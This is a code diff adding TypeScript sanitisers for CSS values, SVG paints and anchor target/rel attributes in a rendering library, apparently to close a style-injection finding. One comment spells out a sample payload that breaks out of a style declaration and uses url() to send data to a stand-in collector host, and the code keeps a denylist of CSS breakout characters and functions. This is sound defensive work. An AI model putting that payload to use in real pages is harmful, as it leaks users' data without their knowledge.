@@ -503,3 +503,271 @@ const indexOfAny = (s: string, chars: readonly string[], from: number): number =
   }
   return best;
 };
+
+// ─── Emission grammar for string-typed slots ─────────────────────────────────
+//
+// The TypeScript host's copy of the rule the F# tier declares in
+// `Fuaran.UI.EmissionGrammar`, beside the URL floor above because it is the
+// same KIND of rule and reaches the same sinks: a value the type says is a
+// `string` and the document says is CSS, a paint, or an anchor token.
+//
+// WHY EVERY HOST NEEDS ITS OWN COPY AND WHY THEY MUST AGREE. `templateColumns`
+// is a free string on the wire, and four server renderers concatenated it into
+// `style="grid-template-columns:…"` with no rule at all — so a value carrying
+// `;background:url(https://collector/?d=…)` closed the declaration, opened a
+// second one the document never wrote, and fetched on RENDER, with no user act,
+// outside the egress policy that governs every href and src in the same
+// document. A React client assigns a style OBJECT and the browser drops the
+// identical value silently. Same tree, exfiltration channel there, inert here —
+// and that DISAGREEMENT is the defect, because a refusal visible on one host and
+// absent on another is a refusal no reader can rely on.
+//
+// The rules are DENY-shaped for CSS and ALLOW-shaped for paints and tokens. A
+// CSS value's grammar is genuinely open (the property and function sets grow,
+// and a positive list would refuse `clamp()` the day CSS shipped it) while the
+// set of characters that let a value leave its declaration is small, stable and
+// enumerable. A colour and an anchor token set are genuinely closed — every
+// member is named in a specification, and a member nobody named is a member
+// nobody vetted.
+
+const cssForbiddenChars = [';', '{', '}', '\\'];
+const cssForbiddenFunctions = ['url(', 'expression('];
+
+/**
+ * The attribute an emission site attaches beside a refused CSS value, so the
+ * refusal is visible in the DOCUMENT and not only in a log. It carries the SLOT
+ * name and never the value, the same discipline the egress refusal marker keeps
+ * and for the same reason: a refused value is the payload.
+ */
+export const cssRefusalAttribute = 'data-fuaran-css-refused';
+
+/**
+ * Is this string safe to concatenate into a CSS declaration?
+ *
+ * What each refused character buys an attacker inside `style="<prop>:<value>"`:
+ * `;` ends the declaration, so everything after it is a NEW property the author
+ * never wrote; `{` and `}` end or open a RULE, reachable wherever the value
+ * lands in a stylesheet; a backslash is CSS's own escape introducer, so an
+ * escaped semicolon is one a character scan would otherwise never see —
+ * refusing the introducer is what makes the rest of the list total; C0 controls
+ * and DEL are parser-differential fodder and never meaningful in a value.
+ *
+ * `url(` and `expression(` are refused by NAME rather than by character,
+ * because their harm is not in their punctuation: `url(` fetches, which is the
+ * finding, and `expression(` executes on legacy engines.
+ *
+ * What this does NOT promise: it is not a CSS parser and says nothing about
+ * whether the surviving string is a VALID value for the property it lands in.
+ * An invalid value is dropped by the browser's own parser — a rendering defect,
+ * not a security one. This bounds what a value can REACH.
+ *
+ * An empty or absent value is SAFE: it contributes nothing to the declaration,
+ * and refusing it would make an absent value indistinguishable from a hostile
+ * one.
+ */
+export const isSafeCssValue = (value: string | undefined): boolean => {
+  if (value == null || value === '') return true;
+  for (const ch of value) {
+    const code = ch.codePointAt(0) ?? 0;
+    if (code < 0x20 || code === 0x7f || cssForbiddenChars.includes(ch)) return false;
+  }
+  // Case-insensitive and whitespace-tolerant on the CSS side: `URL (` and a
+  // newline between the ident and the paren are one token to a CSS tokenizer,
+  // so a scan for the literal lowercase spelling alone is one a payload walks
+  // past.
+  const squashed = value.replace(/\s+/gu, '').toLowerCase();
+  return !cssForbiddenFunctions.some((fn) => squashed.includes(fn));
+};
+
+/**
+ * The CSS value to emit: the value when it passes, the empty string when it
+ * does not.
+ *
+ * Empty rather than a substitute: an empty declaration value is dropped by
+ * every CSS parser, so the element falls back to the stylesheet's own rule,
+ * which is what an author who wrote nothing would have got. A substitute would
+ * be the renderer inventing a layout the document never declared.
+ */
+export const sanitizeCssValue = (value: string | undefined): string =>
+  isSafeCssValue(value) ? (value ?? '') : '';
+
+/**
+ * The CSS value plus the refusal attributes to spread, given the SLOT name the
+ * value came from.
+ */
+export const sanitizeCssValueForSlot = (
+  slot: string,
+  value: string | undefined,
+): [string, Array<[string, string]>] =>
+  isSafeCssValue(value) ? [value ?? '', []] : ['', [[cssRefusalAttribute, slot]]];
+
+const colourFunctions = [
+  'rgb(',
+  'rgba(',
+  'hsl(',
+  'hsla(',
+  'oklch(',
+  'oklab(',
+  'lch(',
+  'lab(',
+  'color(',
+];
+
+/**
+ * Is this a bare CSS IDENT — an ASCII letter or `-` followed by ASCII letters,
+ * digits, `-` and `_`?
+ *
+ * This is what admits the 148 named colours (`red`, `steelblue`,
+ * `rebeccapurple`), the universal keywords (`none`, `transparent`,
+ * `currentColor`), the inheritance keywords, the SVG2 paint keywords
+ * (`context-fill`, `context-stroke`) and every colour keyword CSS has not
+ * shipped yet — as ONE rule rather than as a list somebody has to keep.
+ *
+ * Enumerating the keywords instead is wrong, because the two ways of being
+ * wrong here are not symmetric. A missing keyword produces no error an author
+ * can see: the paint is replaced by `none`, so a document that was correct
+ * yesterday silently renders a differently-coloured picture. Meanwhile an ident
+ * buys an attacker nothing at all — it cannot fetch, cannot leave its
+ * declaration and cannot name a paint server, because every one of those needs
+ * punctuation this test refuses.
+ */
+const isCssIdent = (value: string): boolean => /^[A-Za-z-][A-Za-z0-9_-]*$/u.test(value);
+
+/**
+ * Is this a CSS colour in the closed grammar — a `#rgb` / `#rrggbb` /
+ * `#rrggbbaa` hex, a bare ident, or a call to one of the named colour
+ * functions?
+ *
+ * A paint slot needs a POSITIVE grammar where a generic CSS value needs only a
+ * denylist, and that asymmetry is the finding: a `url(…)` paint contains no
+ * forbidden character, and in an SVG `fill` it names a paint server the user
+ * agent FETCHES. Only naming what a colour may BE excludes it.
+ */
+export const isColourValue = (value: string | undefined): boolean => {
+  if (value == null) return false;
+  const t = value.trim();
+  if (t === '') return false;
+  if (t.startsWith('#')) {
+    const digits = t.slice(1);
+    return [3, 4, 6, 8].includes(digits.length) && [...digits].every((c) => /[0-9a-fA-F]/u.test(c));
+  }
+  if (isCssIdent(t)) return true;
+  const lower = t.toLowerCase();
+  return (
+    colourFunctions.some((fn) => lower.startsWith(fn)) && lower.endsWith(')') && isSafeCssValue(t)
+  );
+};
+
+/**
+ * The SVG paint to emit: the value when it is a colour, `"none"` when it is not.
+ *
+ * `"none"` rather than the empty string, because an EMPTY `fill` / `stroke`
+ * INHERITS the enclosing group's paint instead of clearing it — so an empty
+ * refusal would silently paint the shape with whatever the enclosing group
+ * declared, which is a different picture rather than an absent one.
+ */
+export const sanitizePaintValue = (value: string): string =>
+  isColourValue(value) ? value.trim() : 'none';
+
+/**
+ * The two `target` values a Fuaran link may carry.
+ *
+ * `_parent` and `_top` are meaningful only when the document is FRAMED, and a
+ * framed document navigating its embedder is frame-busting the embedding host
+ * did not consent to. A NAMED frame addresses a browsing context BY NAME, so a
+ * decoded tree can navigate a window it did not create and whose contents it
+ * cannot see, and the name is a free string with no way for a host to enumerate
+ * what it might hit.
+ */
+const allowedLinkTargets = new Set(['_self', '_blank']);
+
+/**
+ * The closed `rel` token set. Every member describes THIS link's relationship
+ * to its destination and changes nothing about the opener's capabilities in the
+ * wrong direction. The one deliberate absence is the finding: `opener`
+ * RE-ENABLES `window.opener` on a `_blank` link, handing the opened document a
+ * live reference to the opening one — the capability `noopener` exists to
+ * remove, and one no rendered tree has any reason to ask for.
+ */
+const allowedLinkRelTokens = new Set([
+  'alternate',
+  'author',
+  'bookmark',
+  'external',
+  'help',
+  'license',
+  'next',
+  'nofollow',
+  'noopener',
+  'noreferrer',
+  'prev',
+  'privacy-policy',
+  'search',
+  'tag',
+  'terms-of-service',
+  'ugc',
+]);
+
+/**
+ * The `target` to emit, or `undefined` to omit the attribute.
+ *
+ * An unrecognised value degrades to omission rather than to `_self`: the two
+ * are the same navigation, and omitting says truthfully that the document
+ * declared nothing this renderer could honour, where substituting would put a
+ * value in the DOM the author never wrote.
+ */
+export const sanitizeLinkTarget = (target: string | undefined): string | undefined => {
+  if (typeof target !== 'string') return undefined;
+  const t = target.trim().toLowerCase();
+  return allowedLinkTargets.has(t) ? t : undefined;
+};
+
+/**
+ * The `rel` tokens to emit, given the declared value and the SANITISED target:
+ * surviving declared tokens first in declared order, then `noopener` and
+ * `noreferrer` FORCED when the target is `_blank`.
+ *
+ * The forcing is what closes the finding. Browsers imply `noopener` there,
+ * which is exactly why the omission is dangerous rather than untidy: the
+ * behaviour is a user-agent DEFAULT, an explicit `rel="opener"` overrides it,
+ * and no document can know its reader's version floor. Emitting the tokens
+ * makes the property a fact about the document rather than about the user
+ * agent.
+ *
+ * The ORDER is fixed so two hosts given one document emit one byte sequence.
+ */
+export const sanitizeLinkRel = (
+  rel: string | undefined,
+  sanitizedTarget: string | undefined,
+): string[] => {
+  const declared: string[] = [];
+  if (typeof rel === 'string') {
+    for (const token of rel.split(/\s+/u)) {
+      const lowered = token.toLowerCase();
+      if (lowered !== '' && allowedLinkRelTokens.has(lowered) && !declared.includes(lowered)) {
+        declared.push(lowered);
+      }
+    }
+  }
+  if (sanitizedTarget === '_blank') {
+    for (const forced of ['noopener', 'noreferrer']) {
+      if (!declared.includes(forced)) declared.push(forced);
+    }
+  }
+  return declared;
+};
+
+/**
+ * The two anchor attributes, resolved TOGETHER — target first, then `rel`,
+ * because the `rel` rule DEPENDS on the sanitised target. A site that sanitised
+ * them independently would get the dependency wrong in exactly the case that
+ * matters. Either result may be `undefined` to omit its attribute.
+ */
+export const sanitizeLinkAnchor = (
+  target: string | undefined,
+  rel: string | undefined,
+): [string | undefined, string | undefined] => {
+  const safeTarget = sanitizeLinkTarget(target);
+  const tokens = sanitizeLinkRel(rel, safeTarget);
+  return [safeTarget, tokens.length > 0 ? tokens.join(' ') : undefined];
+};
